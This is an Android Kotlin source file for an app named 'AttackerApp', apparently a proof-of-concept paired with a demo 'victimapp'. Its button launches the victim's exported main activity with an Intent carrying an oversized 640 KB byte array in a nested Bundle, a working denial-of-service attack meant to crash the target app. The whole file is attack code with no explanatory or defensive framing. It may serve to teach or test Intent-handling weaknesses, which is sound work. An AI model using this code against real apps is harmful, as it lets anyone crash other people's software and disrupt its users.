package com.example.crashintentapp

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Column
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.ui.Alignment
import androidx.compose.ui.platform.LocalContext

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            val context = LocalContext.current
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text("AttackerApp")
                Button(
                    onClick = {
                        val data = ByteArray(800 * 800)
                        Intent().apply {
                            setClassName(
                                "com.example.victimapp",
                                "com.example.victimapp.MainActivity"
                            )
                            putExtra("test", Bundle().apply {
                                putByteArray("data", data)
                            })
                        }.let { context.startActivity(it) }
                    }
                ) {
                    Text("Crash")
                }
            }
        }
    }
}